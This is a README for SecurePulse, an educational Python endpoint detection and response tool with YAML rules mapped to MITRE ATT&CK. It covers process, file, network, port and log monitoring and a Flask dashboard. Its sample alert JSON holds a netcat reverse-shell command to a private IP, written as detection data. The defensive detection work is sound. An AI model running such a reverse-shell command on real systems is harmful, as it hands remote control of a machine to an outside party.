# 🛡 SecurePulse (EDR)
### Intelligent Endpoint Detection & Response System
**Version 1.0.0 | Python 3 | Linux (Kali / Ubuntu)**

---

## 📖 Overview

SecurePulse is a lightweight, modular, **mini EDR (Endpoint Detection & Response)** system designed for educational and lab environments. It simulates real-world endpoint monitoring, threat detection, and incident alerting — structured like a production security product.

It addresses common cybersecurity gaps in small organisations:
- Endpoint-centric blindness
- Alert fatigue (prioritised risk scoring)
- Lack of cross-domain context
- Limited visibility on unsupported devices

---

## ✨ Features

| Module | Capability |
|---|---|
| **Process Monitor** | Tracks running processes, detects reverse shells, miners, enumeration tools |
| **File Monitor** | Watchdog-based real-time FS events; detects ransomware, dropper scripts, sensitive file access |
| **Network Monitor** | Monitors active TCP/UDP connections; flags suspicious ports and external IPs |
| **Port Scanner** | Parallel TCP scan of localhost; flags ports outside the whitelist |
| **Log Analyzer** | Tails auth.log / Apache logs; detects SQLi, XSS, directory traversal, brute-force |
| **Detection Engine** | Rule-based, YAML-driven, MITRE ATT&CK mapped, risk-scored alerting |
| **Alert Manager** | Rich CLI output, JSON persistence, severity filtering, summary table |
| **Web Dashboard** | Flask SPA with auto-refresh, filtering, JSON export |

---

## 🏗 Architecture

```
SecurePulse/
├── main.py                        ← Entry point (CLI modes)
├── requirements.txt
├── README.md
└── vigilcore/
    ├── agent/
    │   ├── process_monitor.py     ← psutil process tracking
    │   ├── file_monitor.py        ← watchdog FS events
    │   ├── network_monitor.py     ← connection monitoring
    │   └── port_scanner.py        ← parallel TCP port scan
    ├── core/
    │   ├── detection_engine.py    ← rule evaluation & correlation
    │   └── alert_manager.py       ← alert lifecycle & output
    ├── analyzer/
    │   └── log_analyzer.py        ← log tailing & pattern detection
    ├── config/
    │   ├── config.yaml            ← system configuration
    │   └── detection_rules.yaml   ← all detection rules (MITRE mapped)
    ├── dashboard/
    │   ├── app.py                 ← Flask REST API + SPA
    │   └── templates/index.html   ← Dark-mode web dashboard
    └── logs/
        ├── alerts.json            ← persistent alert store
        ├── securepulse.log        ← system log
        └── sample_*.log           ← test log files
```

---

## ⚙ Installation

### Requirements
- Python 3.8+
- Linux (Kali Linux / Ubuntu recommended)
- Root/sudo recommended (for network connections and auth.log)

### Setup

```bash
# 1. Clone or extract the project
cd SecurePulse

# 2. (Recommended) Create a virtual environment
python3 -m venv venv
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt
```

---

## 🚀 Usage

### Demo Mode (Recommended first run)
Injects synthetic suspicious events so you can see alerts immediately:
```bash
python main.py demo
```

### Full Monitoring Mode (All modules)
```bash
sudo python main.py full
```

### Single-Pass Scan
```bash
python main.py once
```

### Individual Modules
```bash
python main.py process    # Process monitor only
python main.py network    # Network monitor only
python main.py file       # File monitor only
python main.py ports      # Port scanner only
python main.py logs       # Log analyzer only
```

### Web Dashboard
```bash
# First run a demo to generate alerts, then:
python main.py dashboard
# → Open http://localhost:5000
```

Or enable the dashboard during full mode by editing `config.yaml`:
```yaml
dashboard:
  enabled: true
```

---

## 🧪 Testing with Sample Logs

```bash
# The log analyzer can be tested with included sample files:
python3 - <<'EOF'
import sys; sys.path.insert(0, '.')
from vigilcore.core.alert_manager import AlertManager
from vigilcore.core.detection_engine import DetectionEngine
from vigilcore.analyzer.log_analyzer import LogAnalyzer

am = AlertManager()
de = DetectionEngine(alert_manager=am)
la = LogAnalyzer(de)

la.analyze_file('vigilcore/logs/sample_auth.log')
la.analyze_file('vigilcore/logs/sample_apache.log')
am.print_summary_table()
EOF
```

---

## 🔍 Detection Rules

All rules are defined in `vigilcore/config/detection_rules.yaml` with MITRE ATT&CK mappings.

### Process Rules
| ID | Name | Severity | MITRE |
|---|---|---|---|
| PROC-001 | Reverse Shell Detection | HIGH | T1059 |
| PROC-002 | Enumeration Tools | MEDIUM | T1082 |
| PROC-003 | Privilege Escalation Tools | HIGH | T1548 |
| PROC-004 | Password Cracking | HIGH | T1110 |
| PROC-005 | Crypto Miner Detection | MEDIUM | T1496 |

### Network Rules
| ID | Name | Severity | MITRE |
|---|---|---|---|
| NET-001 | Suspicious Port Activity | HIGH | T1571 |
| NET-002 | High Outbound Connections | MEDIUM | T1041 |

### File Rules
| ID | Name | Severity | MITRE |
|---|---|---|---|
| FILE-001 | Ransomware Behavior | CRITICAL | T1486 |
| FILE-002 | Sensitive File Access | HIGH | T1552 |
| FILE-003 | Script Dropper in /tmp | MEDIUM | T1059 |

### Log Rules
| ID | Name | Severity | MITRE |
|---|---|---|---|
| LOG-001 | SQL Injection Attempt | HIGH | T1190 |
| LOG-002 | XSS Attempt | MEDIUM | T1190 |
| LOG-003 | Brute Force Attack | HIGH | T1110 |
| LOG-004 | Directory Traversal | HIGH | T1190 |

### Port Rules
| ID | Name | Severity |
|---|---|---|
| PORT-001 | Unexpected Open Port | MEDIUM |

---

## 📊 Alert Severity Levels

| Level | Risk Score | Description |
|---|---|---|
| CRITICAL | 90-100 | Immediate action required (e.g. ransomware) |
| HIGH | 70-89 | Serious threat, investigate immediately |
| MEDIUM | 50-69 | Suspicious activity, review soon |
| LOW | 30-49 | Informational, low-priority review |
| INFO | 0-29 | Logged for context |

---

## 🗂 Alert Output

Alerts are stored in `vigilcore/logs/alerts.json`:
```json
{
  "alert_id": "A1B2C3D4",
  "rule_id": "PROC-001",
  "rule_name": "Reverse Shell Detection",
  "severity": "HIGH",
  "risk_score": 90,
  "description": "Detects common reverse shell tools",
  "source_module": "ProcessMonitor",
  "mitre_tactic": "Execution",
  "mitre_technique": "T1059",
  "timestamp": "2025-01-01T12:00:00.000000",
  "details": {
    "pid": 9999,
    "name": "nc",
    "cmdline": "nc -e /bin/bash 192.168.1.10 4444",
    "matched_rule": "nc"
  }
}
```

---

## 🔧 Configuration

Edit `vigilcore/config/config.yaml` to customise:

```yaml
monitoring:
  process:
    interval: 5          # check every 5 seconds
  file:
    watch_paths:
      - /tmp
      - /home
  port_scanner:
    port_range: [1, 1024]
    interval: 60

dashboard:
  enabled: true
  port: 5000
```

---

## 🛠 Adding Custom Rules

Add rules to `vigilcore/config/detection_rules.yaml`:

```yaml
process_rules:
  - id: "PROC-006"
    name: "My Custom Rule"
    description: "Detects my_suspicious_tool"
    severity: "HIGH"
    risk_score: 75
    mitre_tactic: "Execution"
    mitre_technique: "T1059"
    patterns:
      - "my_suspicious_tool"
      - "suspicious_arg"
```

---

## 🌐 Web Dashboard

The Flask dashboard provides:
- Real-time alert feed (auto-refresh every 10 seconds)
- Summary counters by severity
- Filtering by severity, module, and keyword search
- Expandable alert cards with full details
- JSON export button
- MITRE ATT&CK context per alert

Start with: `python main.py dashboard` → http://localhost:5000

---

## ⚠️ Ethical Disclaimer

This tool is designed **exclusively for defensive security purposes** in authorised lab and educational environments.

- **Do NOT** deploy on systems you do not own or have explicit written permission to monitor.
- **Do NOT** use any component for offensive or illegal purposes.
- All detection capabilities are passive and read-only by design.
- The authors accept no liability for misuse.

---

## 🔮 Future Improvements

- [ ] Machine learning anomaly detection (isolation forest)
- [ ] SIEM integration (Splunk / ELK forwarding)
- [ ] Email / Slack / webhook alerting
- [ ] Windows agent support (WMI / Event Log)
- [ ] Threat intelligence IP lookup (AbuseIPDB)
- [ ] Docker container support
- [ ] Alert suppression / whitelisting engine
- [ ] Automated incident response playbooks

---

## 📄 License

Educational use only. Not for production deployment without further hardening.

---

*Built with ❤️ for cybersecurity learners and defenders.*
